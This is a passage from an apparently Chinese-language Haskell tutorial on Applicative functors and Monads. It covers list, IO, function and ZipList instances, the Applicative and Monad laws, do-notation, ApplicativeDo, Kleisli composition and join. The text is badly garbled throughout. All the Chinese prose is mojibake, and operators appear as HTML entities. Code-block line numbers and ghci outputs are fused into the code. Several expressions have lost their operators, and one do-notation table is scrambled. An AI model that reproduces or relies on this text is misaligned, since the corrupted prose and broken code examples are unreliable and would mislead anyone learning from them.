pureå‡½æ•°ï¼šå¯¹äºåˆ—è¡¨è€Œè¨€ï¼Œä¸€ä¸ªå€¼çš„æœ€å°ä¸Šä¸‹æ–‡å°±æ˜¯åªåŒ…å«è¿™ä¸ªå€¼çš„åˆ—è¡¨[x] &lt;*&gt;å‡½æ•°ï¼šåˆ—è¡¨çš„&lt;*&gt;å‡½æ•°æ˜¯é€šè¿‡åˆ—è¡¨æ¨å¯¼æ¥å®ç°çš„ã€‚å› ä¸ºä¸åŒäºMaybeçš„JuståªåŒ…å«ä¸€ä¸ªå€¼ï¼Œåˆ—è¡¨å¯ä»¥åŒ…å«å¾ˆå¤šå€¼ï¼Œç¬¬ä¸€ä¸ªä¼ å…¥çš„åˆ—è¡¨ä¸­å¯èƒ½ä¼šåŒ…å«å¾ˆå¤šå‡½æ•°ï¼Œç¬¬äºŒä¸ªä¼ å…¥çš„åˆ—è¡¨ä¹Ÿä¼šåŒ…å«å¾ˆå¤šå€¼ï¼Œæ‰€ä»¥å°±éœ€è¦å…ˆä»ç¬¬ä¸€ä¸ªåˆ—è¡¨ä¸­å–å‡ºä¸€ä¸ªå‡½æ•°ç„¶åä¾æ¬¡åº”ç”¨åœ¨ç¬¬äºŒä¸ªåˆ—è¡¨çš„æ¯ä¸ªå€¼ä¸­ï¼Œå†å–å‡ºç¬¬ä¸€ä¸ªåˆ—è¡¨ä¸­çš„ç¬¬äºŒä¸ªå‡½æ•°åº”ç”¨åœ¨ç¬¬äºŒä¸ªåˆ—è¡¨çš„æ¯ä¸ªå€¼ä¸­â€¦â€¦æœ€ç»ˆè¿”å›å¾—åˆ°çš„æ‰€æœ‰ç»“æœçš„åˆ—è¡¨ ä½¿ç”¨ä¾‹å­ï¼š 1234ghci&gt; [(+3), (*2)] &lt;*&gt; [1, 2][4,5,2,4]ghci&gt; [(+), (*)] &lt;*&gt; [1, 2] &lt;*&gt; [3, 4] [4, 5, 5, 6, 3, 4, 6, 8] IO123456instance Applicative IO where pure = return a &lt;*&gt; b = do f &lt;- a x &lt;- b return (f x) ä¹Ÿä¸éš¾ç†è§£ï¼Œpureå‡½æ•°ç›´æ¥å°†ä¼ å…¥çš„å€¼returnï¼Œç›¸å½“äºæ”¾åœ¨äº†IOçš„ä¸Šä¸‹æ–‡ä¸­ã€‚è€Œ&lt;*&gt;å‡½æ•°å…ˆå°†ä¸¤ä¸ªIOä¸­å†…å®¹æå–å‡ºæ¥ï¼Œç„¶ååº”ç”¨å‡½æ•°åreturnï¼Œå½¢æˆæ–°çš„IOå‡½å­ 1234ghci&gt; (++) &lt;$&gt; getLine &lt;*&gt; getLineLine1Line2&quot;Line1Line2&quot; (-&gt;) r(-&gt;) råŒæ ·ä¹Ÿæ˜¯ä¸€ä¸ªåº”ç”¨å‡½å­ï¼Œå’Œå‡½å­çš„åˆ†æä¸€æ ·ï¼Œå…ˆæ¥åˆ†æå®ƒçš„&lt;*&gt;å‡½æ•°çš„ç±»å‹ç­¾åï¼š :: f (a -> b) -> f a -> f b å…¶ä¸­fä¸º(-&gt;) rï¼Œå°†å…¶ä»£å…¥å¹¶æ›¿æ¢ä¸ºä¸­ç¼€ï¼š :: (r -> a -> b) -> (r -> a) -> (r -> b) å¯ä»¥çœ‹å‡ºå®ƒæ¥æ”¶ä¸¤ä¸ªå‡½æ•°f :: r -&gt; a -&gt; bã€g :: r -&gt; aï¼Œè¿”å›å¦ä¸€ä¸ªå‡½æ•°h :: (r -&gt; b) é‚£ä¹ˆè¿”å›çš„å‡½æ•°çš„è¾“å…¥ä¸ºrï¼Œè¾“å‡ºä¸ºbï¼Œæ‰€ä»¥å…ˆå¯¹è¾“å…¥åº”ç”¨å‡½æ•°gå¾—åˆ°aï¼Œç„¶ååœ¨å¯¹rå’Œaåº”ç”¨få¾—åˆ°bï¼Œæ‰€ä»¥æ¨æµ‹&lt;*&gt;å‡½æ•°çš„æ“ä½œå°±æ˜¯ï¼š \\x -> f x (g x) äºæ˜¯ï¼š 123instance Applicative ((-&gt;) r) where pure x = (\\_ -&gt; x) f &lt;*&gt; g = \\x -&gt; f x (g x) å°†ä¸€ä¸ªå€¼æ”¾åœ¨å‡½æ•°çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œæœ€å°ä¸Šä¸‹æ–‡å°±åº”è¯¥è¿”å›è¿™ä¸ªå€¼æœ¬èº«ï¼Œæ‰€ä»¥pureå‡½æ•°å®šä¹‰ä¸º(_ -&gt; x)ï¼Œå³æ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œéƒ½è¿”å›x åº”ç”¨å‡½å­çš„&lt;*&gt;å‡½æ•°æ¥æ”¶ä¸¤ä¸ªå‡½å­ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„å‡½å­ã€‚å¯¹äº(-&gt;) rï¼Œå®ƒæ¥æ”¶ä¸¤ä¸ªå‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„å‡½æ•°ã€‚å…·ä½“ä¾‹å­ï¼š 12ghci&gt; (+) &lt;$&gt; (+3) &lt;*&gt; (*100) $ 5508 æ‰§è¡Œè¿™å¥æ—¶å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿï¼š 12345678 (+) &lt;$&gt; (+3) &lt;*&gt; (*100) $ 5= ((+) &lt;$&gt; (+3)) &lt;*&gt; (*100) $ 5= ((+) . (+3)) &lt;*&gt; (*100) $ 5 = (\\a -&gt; (+) ((+3) a)) &lt;*&gt; (*100) $ 5= (\\a b -&gt; (a + 3 + b)) &lt;*&gt; (*100) $ 5= (\\x -&gt; x + 3 + ((*100) x)) $ 5= (\\x -&gt; x + 3 + x * 100) $ 5= 5 + 3 + 5 * 100 = 508= (5 + 3) + (5 * 100) æ‰€ä»¥å°±ç›¸å½“äºå…ˆå¯¹è¾“å…¥åˆ†åˆ«æ‰§è¡Œ(+3)å’Œ(*100)ï¼Œç„¶åå°†ä¸¤ä¸ªç»“æœæ‰§è¡Œäº†(+) åŒæ ·ï¼š 12ghci&gt; (\\x y z -&gt; [x,y,z]) &lt;$&gt; (+3) &lt;*&gt; (*2) &lt;*&gt; (/2) $ 5 [8.0,10.0,2.5] å…ˆå¯¹5åˆ†åˆ«æ‰§è¡Œ(+3)ã€(*2)ã€(/2)ï¼Œç„¶åå°†å¾—åˆ°çš„ä¸‰ä¸ªç»“æœä¼ å…¥(\\x y z -&gt; [x,y,z])å¾—åˆ°äº†æœ€ç»ˆçš„ç»“æœ 12 f &lt;$&gt; g &lt;*&gt; h &lt;*&gt; i= (\\x -&gt; f (g x) (h x) (i x)) ZipListæ™®é€šåˆ—è¡¨å®ç°çš„&lt;*&gt;å‡½æ•°æ˜¯å°†æ¯ä¸ªå‡½æ•°åº”ç”¨åœ¨æ‰€æœ‰å€¼ä¸Šï¼Œä½†è¿˜æœ‰ä¸€ç§å®ç°æ–¹æ³•æ˜¯å°†æ¯ä¸ªå‡½æ•°åº”ç”¨åœ¨å¯¹åº”å€¼ä¸Šï¼Œå› ä¸ºåŒä¸€ä¸ªç±»å‹ä¸èƒ½å­˜åœ¨åŒä¸€å‡½æ•°çš„ä¸¤ç§å®ç°å½¢å¼ï¼Œæ‰€ä»¥å¼•å…¥äº†ä¸€ä¸ªæ–°çš„åˆ—è¡¨ZipListï¼ŒåŒ…å«åœ¨Control.Applicativeæ¨¡å—ä¸­ 123instance Applicative ZipList where pure x = ZipList (repeat x) ZipList fs &lt;*&gt; ZipList xs = ZipList (zipWith ($) fs xs) ä½†æ˜¯ZipListå¹¶ä¸æ˜¯Showçš„å®ä¾‹ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥æ˜¾ç¤ºå‡ºæ¥ï¼Œè¦ä½¿ç”¨getZipListæ¥è·å–å®ƒå†…éƒ¨çš„åˆ—è¡¨ï¼š 1234ghci&gt; getZipList $ (+) &lt;$&gt; ZipList [1,2,3] &lt;*&gt; ZipList [100,100..] [101,102,103]ghci&gt; getZipList $ (,,) &lt;$&gt; ZipList &quot;dog&quot; &lt;*&gt; ZipList &quot;cat&quot; &lt;*&gt; ZipList &quot;rat&quot; [('d','c','r'),('o','a','a'),('g','t','t')] Applicative Functor Lawsåº”ç”¨å‡½å­ä¸€èˆ¬æœ‰å››ä¸ªå®šå¾‹ï¼Œéƒ½æ˜¯ä¿è¯pureçš„æ­£ç¡®æ€§çš„ï¼š Identity lawï¼špure id &lt;*&gt; v = v Homomorphismï¼špure f &lt;*&gt; pure x = pure (f x) Interchangeï¼šu &lt;*&gt; pure v = pure ($ v) &lt;*&gt; u Compositionï¼šu &lt;*&gt; (v &lt;*&gt; w) = pure (.) &lt;*&gt; u &lt;*&gt; v &lt;*&gt; w Intuitionç†è§£åº”ç”¨å‡½å­çš„æ–¹å¼ä¹Ÿæ˜¯å°†å…¶çœ‹ä½œæ˜¯è®¡ç®—ä¸Šä¸‹æ–‡ï¼ˆcontextï¼‰ï¼Œæ¯”å¦‚è¦è®¡ç®—ï¼š$$[[\\ \\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ \\ ]]$$ å…¶ä¸­$x_i$çš„ç±»å‹æ˜¯$f\\ t_i$ï¼Œ$f$æ˜¯åº”ç”¨å‡½å­ï¼ˆçœ‹ä½œä¸Šä¸‹æ–‡ï¼‰ã€‚è€Œå‡½æ•°$g$çš„ç±»å‹æ˜¯ï¼š $$t_1\\to t_2\\to\\cdots\\to t_n\\to t$$ æ‰€ä»¥åŒæ‹¬å·ï¼ˆidiom bracketsï¼‰çš„ä½œç”¨æ˜¯å°†ä¸€ä¸ªæ™®é€šå‡½æ•°åº”ç”¨åœ¨åŒ…å«åœ¨ä¸Šä¸‹æ–‡ä¸­çš„å‚æ•°ä¸Šã€‚$g\\ x_1$å¯ä»¥é€šè¿‡fmapæ¥æ‰§è¡Œï¼Œå°†$g$æå‡ï¼ˆliftï¼‰åˆ°$x_1$çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œç„¶ååº”ç”¨åœ¨$x_1$ä¸Šã€‚ä½†æ˜¯fmapè¿”å›çš„ç»“æœæ˜¯ä¸€ä¸ªå‡½å­ï¼Œæ¢å¥è¯è¯´ï¼Œ$g\\ x_1$ç»“æœçš„ç±»å‹æ˜¯ï¼š $$f\\ \\ (t_2\\to t_3\\to\\cdots\\to t_n\\to t)$$ ä½†æ˜¯fmapå¹¶ä¸èƒ½å°†ä¸Šä¸‹æ–‡ä¸­çš„å‡½æ•°åº”ç”¨åœ¨ä¸Šä¸‹æ–‡ä¸­çš„å‚æ•°ä¸Šï¼Œäºæ˜¯åº”ç”¨å‡½å­çš„&lt;*&gt;å‡½æ•°æä¾›äº†è¿™ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥è®¡ç®—$[[\\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ ]]$ï¼Œåªéœ€è¦ï¼š g x1 x2 ... xn è€Œpureå‡½æ•°çš„ä½œç”¨å°±æ˜¯å°†ä¸€ä¸ªä¸åœ¨ä¸Šä¸‹æ–‡ä¸­çš„å€¼ï¼ˆå‡½æ•°æˆ–å‚æ•°ï¼‰æå‡åˆ°ä¸Šä¸‹æ–‡ä¸­ï¼Œä½†ä¸è¿›è¡Œå…¶ä»–æ“ä½œã€‚æ¯”å¦‚å‚æ•°$x_2$å¦‚æœä¸åœ¨ä¸Šä¸‹æ–‡ä¸­ï¼Œéœ€è¦ç”¨pureæå‡åˆ°ä¸Šä¸‹æ–‡ä¸­æ‰èƒ½æŒ‰ä¸Šé¢è®¡ç®—ï¼š g x1 pure x2 ... xn å¸¸ç”¨å‡½æ•°liftA &amp; liftA2 &amp; liftA3liftA :: Applicative f => (a -> b) -> f a -> f b liftA2 :: Applicative f => (a -> b -> c) -> f a -> f b -> f c liftA3 :: Applicative f => (a -> b -> c -> d) -> f a -> f b -> f c -> f d ä¸éš¾æ¨æµ‹liftAå°±æ˜¯fmapï¼ŒliftA2 f x1 x2ç›¸å½“äºf &lt;$&gt; x1 &lt;*&gt; x2ï¼ŒliftA3 f x1 x2 x3ç›¸å½“äºf &lt;$&gt; x1 &lt;*&gt; x2 &lt;*&gt; x3 &lt;* &amp; *&gt;ç±»å‹ç±»ä¼¼å‡½å­çš„&lt;$å’Œ$&gt;ï¼š (&lt;*) :: Applicative f => f a -> f b -> f a (*>) :: Applicative f => f a -> f b -> f b &lt;*æ¥æ”¶ä¸¤ä¸ªå‡½å­ï¼Œå¦‚æœä¸¤ä¸ªå‡½å­ä¸­åˆä¸€ä¸ªä¸ºç©ºï¼Œå°±è¿”å›ç©ºï¼Œå¦åˆ™è¿”å›çš„ç±»å‹ä¸ç¬¬ä¸€ä¸ªå‡½å­ç›¸åŒã€‚*&gt;åè¿‡æ¥ 12345678910111213141516ghci&gt; Just 3 &lt;* Just 4Just 3ghci&gt; Just 3 *&gt; Just 4Just 4ghci&gt; Nothing &lt;* Just 3Nothingghci&gt; Nothing *&gt; Just 3Nothingghci&gt; [1, 2, 3] &lt;* [3, 4][1,1,2,2,3,3]ghci&gt; [1, 2, 3] *&gt; [3, 4][3,4,3,4,3,4]ghci&gt; [] &lt;* [1, 2, 3][]ghci&gt; [] *&gt; [1, 2, 3][] &lt;**&gt;(**) :: Applicative f => f a -> f (a -> b) -> f b æ¥æ”¶çš„å‚æ•°æ˜¯&lt;*&gt;åè½¬è¿‡æ¥çš„ï¼Œå³å…ˆæ¥æ”¶ä¸€ä¸ªå‚æ•°å‡½å­ï¼Œç„¶åæ¥æ”¶ä¸€ä¸ªå‡½æ•°å‡½å­ï¼Œåœ¨å°†å…¶åº”ç”¨è¿”å›ã€‚ä½†æ˜¯å’Œflip(&lt;*&gt;)ä¸åŒï¼Œå®ƒå…ˆå–å‚æ•°å‡½å­çš„æ¯ä¸ªå‚æ•°ï¼Œç„¶åå†å–å‡½æ•°å‡½å­ä¸­çš„å‡½æ•°é€ä¸ªåº”ç”¨ï¼š 123456ghci&gt; [(+1), (+2), (+3)] &lt;*&gt; [1, 2][2,3,3,4,4,5]ghci&gt; [1, 2] &lt;**&gt; [(+1), (+2), (+3)][2,3,4,3,4,5]ghci&gt; flip(&lt;*&gt;) [1, 2] [(+1), (+2), (+3)][2,3,3,4,4,5] when &amp; unlesswhen :: Applicative f => Bool -> f () -> f () ä¼ å…¥çš„ç¬¬ä¸€ä¸ªæ˜¯ä¸€ä¸ªç»“æœä¸ºBoolç±»å‹çš„æµ‹è¯•ï¼Œå¦‚æœæµ‹è¯•ä¸ºTrueï¼Œåˆ™è°ƒç”¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œå¦åˆ™è¿”å›pure ()ã€‚ï¼ˆwhenå‡½æ•°åœ¨ä¸Šæ–‡IOæ“ä½œä¸­ä½¿ç”¨è¿‡ï¼‰ unlessåˆ™ä¸whenç›¸åï¼Œæµ‹è¯•ä¸ºTrueè¿”å›pure () sequenceAsequenceA :: (Traversable t, Applicative f) => t (f a) -> f (t a) åº”ç”¨åœ¨åˆ—è¡¨ä¸Šæ—¶ï¼Œå®ƒçš„ç±»å‹ç›¸å½“äºï¼š [f a] -> f [a] æ‰€ä»¥åœ¨åˆ—è¡¨ä¸Šå®ƒçš„ä½¿ç”¨æ–¹æ³•ï¼š 12345678910ghci&gt; sequenceA [Just 3, Just 2, Just 1] Just [3,2,1] ghci&gt; sequenceA [Just 3, Nothing, Just 1] Nothing ghci&gt; sequenceA [(+3),(+2),(+1)] 3 [6,5,4] ghci&gt; sequenceA [[1,2,3],[4,5,6]] [[1,4],[1,5],[1,6],[2,4],[2,5],[2,6],[3,4],[3,5],[3,6]] ghci&gt; sequenceA [[1,2,3],[4,5,6],[3,4,4],[]] [] å®ƒåœ¨å¯¹åŒä¸€ä¸ªå‚æ•°åº”ç”¨ä¸åŒå‡½æ•°æ—¶å¾ˆæœ‰ç”¨ï¼š 1234ghci&gt; map (\\f -&gt; f 7) [(&gt;4), (&lt;10), odd] [True,True,True] ghci&gt; sequenceA [(&gt;4), (&lt;10), odd] 7 [True,True,True] Monadå•å­ï¼ˆMonadï¼‰æ˜¯å¯¹Applicative Functorçš„æ‰©å±•ï¼ˆä½†æ˜¯è¯ç”Ÿæ¯”Applicativeæ—©ï¼‰ï¼ŒFunctorçš„&lt;$&gt;å‡½æ•°å®ç°äº†å°†æ™®é€šå‡½æ•°åº”ç”¨åœ¨ä¸Šä¸‹æ–‡å€¼ä¸Šï¼ŒApplicativeçš„&lt;*&gt;å‡½æ•°å°†ä¸Šä¸‹æ–‡ä¸­å‡½æ•°åº”ç”¨åœ¨ä¸Šä¸‹æ–‡å€¼ä¸Šã€‚è€ŒMonadæä¾›äº†ä¸€ä¸ªå‡½æ•°&gt;&gt;=ï¼ˆbindï¼‰ï¼Œå°†ä¸€ä¸ªæ¥æ”¶æ™®é€šå€¼è¿”å›ä¸Šä¸‹æ–‡å€¼çš„å‡½æ•°åº”ç”¨åœ¨ä¸Šä¸‹æ–‡å€¼ä¸Šï¼š 123456class Applicative m =&gt; Monad m where (&gt;&gt;=) :: m a -&gt; (a -&gt; m b) -&gt; m b (&gt;&gt;) :: m a -&gt; m b -&gt; m b return :: a -&gt; m a m &gt;&gt; n = m &gt;&gt;= \\_ -&gt; n return = pure returnå‡½æ•°ï¼šå’Œpureä¸€æ ·ï¼Œåªæ˜¯æœ‰å¦ä¸€ä¸ªåå­— &gt;&gt;å‡½æ•°ï¼šæä¾›äº†é»˜è®¤çš„å®ç°æ–¹æ³•ï¼Œå®ƒçš„ä½œç”¨å’ŒApplicativeçš„*&gt;å‡½æ•°ä¸€æ · &gt;&gt;=å‡½æ•°ï¼ˆbindï¼‰ï¼šæ¯”Applicativeå‡çº§çš„å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå•å­ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ¥æ”¶å€¼è¿”å›å•å­çš„å‡½æ•°ï¼Œå°†è¿™ä¸ªå‡½æ•°åº”ç”¨åœ¨ç¬¬ä¸€ä¸ªå‚æ•°å•å­ä¸­çš„å€¼ä¸Šï¼Œå¹¶è¿”å›å¾—åˆ°çš„æ–°å•å­ Monadå®ä¾‹MaybeMaybeæ˜¯ä¸€ä¸ªå•å­å®ä¾‹ï¼ŒApplicativeå·²ç»ä¸ºå®ƒå®ç°äº†returnï¼Œå› æ­¤åªéœ€è¦&gt;&gt;=å‡½æ•°ï¼š 123instance Monad Maybe where (Just x) &gt;&gt;= f = f x Nothing &gt;&gt;= _ = Nothing æ ¹æ®å®šä¹‰å°±å¾ˆå®¹æ˜“å®ç°Maybeçš„&gt;&gt;=å‡½æ•°äº†ï¼Œè€Œä¸”ä¹Ÿå¾ˆå¥½ç†è§£ 12345678ghci&gt; Just 1 &gt;&gt;= \\x -&gt; Just (x + 1)Just 2ghci&gt; Just 1 &gt;&gt;= \\x -&gt; return (x + 1)Just 2ghci&gt; Nothing &gt;&gt;= \\x -&gt; Just (x + 1)Nothingghci&gt; Just 1 &gt;&gt;= \\x -&gt; Just (x + 1) &gt;&gt; Nothing &gt;&gt;= \\y -&gt; Just (y + 1)Nothing æœ€åä¸€ä¸ªä¾‹å­ä¸­å‡ºç°äº†&gt;&gt; Nothingï¼Œè¿™æ—¶Nothingå‰çš„éƒ¨åˆ†å…¨éƒ½ç›¸å½“äºæ²¡ç”¨ï¼Œå› ä¸º&gt;&gt;æ“ä½œç¬¦çš„å·¦å³ä¸¤è¾¹åªè¦æœ‰ä¸€ä¸ªå‡ºç°Nothingï¼Œé‚£æ•´ä½“å°±ä¼šæ˜¯Nothingã€‚è¿™ä¸ªç‰¹æ€§å¯ä»¥ç”¨äºåœ¨ä¸­é€”éšæ—¶åˆ¤æ–­å¤±è¯¯ï¼Œåªè¦æœ‰ä¸€å¤„å¤±è¯¯ï¼Œç»“æœå°±ä¼šæ˜¯Nothing []åˆ—è¡¨ä¹Ÿæ˜¯ä¸€ä¸ªå•å­ï¼š 12instance Monad [] where xs &gt;&gt;= f = concat (map f xs) å°†è¿™ä¸ªå‡½æ•°åº”ç”¨åœ¨xsçš„æ¯ä¸ªå€¼ä¸Šï¼Œå°†è¿”å›çš„æ‰€æœ‰åˆ—è¡¨å¹³é“ºæˆä¸€ä¸ªåˆ—è¡¨ï¼š 1234ghci&gt; [3,4,5] &gt;&gt;= \\x -&gt; [x,-x] [3,-3,4,-4,5,-5] ghci&gt; [1,2] &gt;&gt;= \\n -&gt; ['a','b'] &gt;&gt;= \\ch -&gt; return (n,ch) [(1,'a'),(1,'b'),(2,'a'),(2,'b')] IOIOä¹Ÿæ˜¯ä¸€ä¸ªå•å­ï¼Œä½†æ˜¯å®ç°æ–¹æ³•æ¯”è¾ƒæ·±å¥¥ï¼ˆé€ƒ (-&gt;) r(-&gt;) rä¹Ÿæ˜¯ä¸€ä¸ªå•å­ï¼Œå’ŒFunctorã€Applicativeä¸€æ ·ï¼Œå…ˆåˆ†æå®ƒçš„&gt;&gt;=ç±»å‹ç­¾åï¼š (>>=) :: (-> r) a -> (a -> (-> r) b) -> (-> r) b (>>=) :: (r -> a) -> (a -> r -> b) -> (r -> b) ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œå®ƒæ¥æ”¶ä¸¤ä¸ªå‡½æ•°f :: r -&gt; aã€g :: a -&gt; r -&gt; bï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–°çš„å‡½æ•°h :: r -&gt; b é‚£ä¹ˆå‡½æ•°hæ¥æ”¶ä¸€ä¸ªç±»å‹ä¸ºrçš„å‚æ•°ï¼Œè¿”å›ä¸€ä¸ªç±»å‹ä¸ºbçš„å€¼ã€‚æ‰€ä»¥å…ˆå¯¹è¾“å…¥åº”ç”¨få¾—åˆ°ç±»å‹ä¸ºaçš„ä¸­é—´å€¼ï¼Œç„¶åå†å°†è¿™ä¸ªå€¼å’Œè¾“å…¥å‚æ•°ä¸€èµ·ä¼ å…¥å‡½æ•°gå¾—åˆ°ç»“æœã€‚æ‰€ä»¥å‡½æ•°hçš„å®šä¹‰åº”è¯¥æ˜¯ï¼š \\x -> g (f x) x 12instance Monad ((-&gt;) r) where f &gt;&gt;= g = \\x -&gt; g (f x) x 1234ghci&gt; (+3) &gt;&gt;= (+) $ 15ghci&gt; (+) &lt;$&gt; (+3) &lt;*&gt; id $ 15 do-notationHaskellçš„doè¯­å¥ä¸ºé“¾å¼çš„&gt;&gt;=åº”ç”¨æä¾›äº†ç±»ä¼¼å‘½ä»¤å¼ï¼ˆimperative styleï¼‰çš„è¯­æ³•ç³–ã€‚æ¯”å¦‚a &gt;&gt;= \\x -&gt; b &gt;&gt; c &gt;&gt;= \\y -&gt; dï¼š 1234a &gt;&gt;= \\x -&gt;b &gt;&gt;c &gt;&gt;= \\y -&gt;d å…¶ä¸­æœ‰abcdå››ä¸ªå€¼ï¼Œå¯ä»¥çœ‹å‡ºaä¸­å†…å®¹ç»‘å®šåˆ°äº†xä¸Šï¼Œcä¸­å†…å®¹ç»‘å®šåˆ°äº†yä¸Šã€‚ä½¿ç”¨doè¯­å¥æ¥è¡¨ç¤ºè¿™ä¸ªæ“ä½œå¯ä»¥å†™æˆï¼š 12345do { x &lt;- a ; b ; y &lt;- c ; d } å…¶ä¸­çš„å¤§æ‹¬å·å’Œåˆ†å·å¯ä»¥çœç•¥ä¸å†™ï¼ˆæŒ¤åœ¨ä¸€è¡Œæ—¶ä¸èƒ½çœç•¥ï¼‰ã€‚doè¯­å¥ä¹Ÿåªæ˜¯ä¸€ä¸ªè¯­æ³•ç³–ï¼Œå®ƒå¯ä»¥é€’å½’åœ°è½¬æ¢æˆæ™®é€šçš„Monadæ“ä½œè¯­å¥ï¼š do eï¼še do { e; ... }ï¼še &gt;&gt; do { â€¦ } do { v &lt;- e; ... }ï¼še &gt;&gt;= \\v -&gt; do { â€¦ } do { let ...; ... }ï¼šlet â€¦ in do { â€¦ } ApplicativeDoæ¯”å¦‚å¦‚ä¸‹ä¸€ä¸ªdoè¯­å¥ï¼š 1234do x &lt;- a y &lt;- b z &lt;- c return (f x y z) å®ƒå¯ä»¥è½¬åŒ–æˆï¼š a >>= \\x -> b >>= \\y -> c >>= \\z -> return (f x y z) ä½†æ˜¯ç»è¿‡è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œæ•´ä¸ªè¯­å¥å®é™…ä¸Šå°†å‡½æ•°fåº”ç”¨åœ¨äº†ä¸‰ä¸ªä¸Šä¸‹æ–‡ä¸­çš„å€¼ä¸Šï¼Œæ‰€ä»¥ä»…ç”¨Applicativeçš„&lt;$&gt;å’Œ&lt;*&gt;å®Œå…¨å¯ä»¥å®ç°ï¼š f a b c è€Œä¸”åœ¨è¿è¡Œçš„æ—¶å€™Applicativeçš„æ•ˆç‡ä¼šæ¯”Monadé«˜ï¼Œæ‰€ä»¥Haskellä¼šå°†doè¯­å¥å°½å¯èƒ½ä¼˜å…ˆè½¬æ¢ä¸ºApplicativeçš„è¡¨ç¤ºæ–¹æ³•ç„¶åå†è®¡ç®— Monad Laws Left identityï¼š return a &gt;&gt;= k = k a Right identityï¼šm &gt;&gt;= return = m Associativityï¼š(m &gt;&gt;= g) &gt;&gt;= h = m &gt;&gt;= (\\x -&gt; g x &gt;&gt;= h) å‰ä¸¤ä¸ªå®šå¾‹å¾ˆå¥½ç†è§£ï¼š å°†aæ³¨å…¥ä¸Šä¸‹æ–‡ä¹‹åç»‘å®šï¼ˆbindï¼‰ç»™å‡½æ•°k(:: a -&gt; m a)ï¼Œç›¸å½“äºç›´æ¥å°†aç›´æ¥ä¼ å…¥å‡½æ•°k å°†å·²ç»åŒ…å«åœ¨ä¸Šä¸‹æ–‡ä¸­çš„å€¼ç»‘å®šç»™returnå‡½æ•°ï¼Œç›¸å½“äºä¿æŒä¸å˜ ç¬¬ä¸‰ä¸ªå®šå¾‹æ˜¯ç»“åˆå¾‹ï¼ŒæŠŠå®ƒå†™æˆæ›´åƒç»“åˆå¾‹çš„è¡¨ç¤ºæ–¹æ³•æ˜¯ï¼š (m >>= (\\x -> g x)) >>= h = m >>= (\\x -> g x >>= h) ç»„åˆè¿ç®—ç¬¦ï¼ˆ&gt;=&gt;ï¼‰å½¢å¼Control.Monadæ¨¡å—ä¸­è¿˜å®šä¹‰äº†å‡½æ•°&gt;=&gt;ï¼ˆKleisli-composition operatorï¼‰ï¼š 123infixr 1 &gt;=&gt;(&gt;=&gt;) :: Monad m =&gt; (a -&gt; m b) -&gt; (b -&gt; m c) -&gt; (a -&gt; m c)f &gt;=&gt; g = \\x -&gt; f x &gt;&gt;= g ä½¿ç”¨&gt;=&gt;è¿ç®—ç¬¦å¯ä»¥å°†ä¸¤ä¸ªç”¨äºç»‘å®šçš„å‡½æ•°ç»“åˆåœ¨ä¸€èµ·ã€‚ç”¨å®ƒè¡¨ç¤ºçš„Monadå®šå¾‹æ›´åŠ æ¸…æ™°ç›´è§‚ï¼š Left identityï¼šreturn &gt;=&gt; f = f Right identityï¼šf &gt;=&gt; return = f Associativityï¼š(f &gt;=&gt; g) &gt;=&gt; h = f &gt;=&gt; (g &gt;=&gt; h) do-notationå½¢å¼Monadçš„è¿™ä¸‰ä¸ªå®šå¾‹è¿˜å¯ä»¥ä½¿ç”¨doè¯­å¥æ¥æè¿°ï¼š Left identityï¼š 123do { x' &lt;- return x; f x' = do { f x } } Right identityï¼š 123do { x &lt;- m; return x = do { m } } Associativityï¼š 12345do { y &lt;- do { x &lt;- m; do { x &lt;- m; do { x &lt;- m; f x do { y &lt;- f x; y &lt;- f x; } = g y = g y g y } } } } IntuitionMonadä¹Ÿå¯ä»¥å¾ˆè‡ªç„¶åœ°çœ‹æˆApplicativeçš„å‡çº§ç‰ˆï¼Œæ¯”å¦‚Applicativeçš„æ“ä½œå…¨éƒ¨æ˜¯å›ºå®šçš„ï¼Œè€ŒMonadçš„æ“ä½œå¯ä»¥åœ¨ä¸­é€”çªç„¶æ”¹å˜ åŒæ—¶Monadä¹Ÿå®Œæˆäº†Functorå’ŒApplicativeæ— æ³•å®Œæˆçš„æ“ä½œã€‚æ¯”å¦‚è¦ç”¨fmapå’Œå®ç°&gt;&gt;=å‡½æ•°ï¼ˆå³è¾¾æˆæ“ä½œ m a -&gt; (a -&gt; m b) -&gt; m bï¼‰ï¼Œå…ˆå‡è®¾ f :: a -&gt; m bï¼Œé‚£ä¹ˆfmap fçš„ç±»å‹å°±ä¼šæ˜¯ m a -&gt; m (m b)ï¼Œå°†m aåº”ç”¨åœ¨fmap fä¸Šä¼šå¾—åˆ°ç»“æœm (m b)ï¼Œè€Œä¸æ˜¯m bã€‚ä½†æ˜¯ç›®å‰åªå¯ä»¥ä½¿ç”¨pureå°†ä¸€ä¸ªå€¼è£…å…¥ä¸Šä¸‹æ–‡ä¸­ï¼ˆa -&gt; m aï¼‰ï¼Œè€Œæ²¡æœ‰ä¸€ä¸ªå‡½æ•°å¯ä»¥ä»ä¸Šä¸‹æ–‡ä¸­æå–å€¼ï¼ˆm a -&gt; aï¼‰ã€‚é‚£ä¹ˆå°±éœ€è¦å®šä¹‰ä¸€ä¸ªæ–°çš„å‡½æ•°æ¥å®ç°è¿™ä¸ªæ“ä½œçš„æ•ˆæœï¼ˆm (m b) -&gt; m bï¼‰ã€‚å› æ­¤Monadçš„å¦ä¸€ä¸ªç­‰æ•ˆçš„å®šä¹‰æ–¹æ³•æ˜¯ï¼š 12345class Applicative m =&gt; Monad' m where join :: m (m a) -&gt; m a (&gt;&gt;=) :: m a -&gt; (a -&gt; m b) -&gt; m b x &gt;&gt;= f = join $ fmap f x 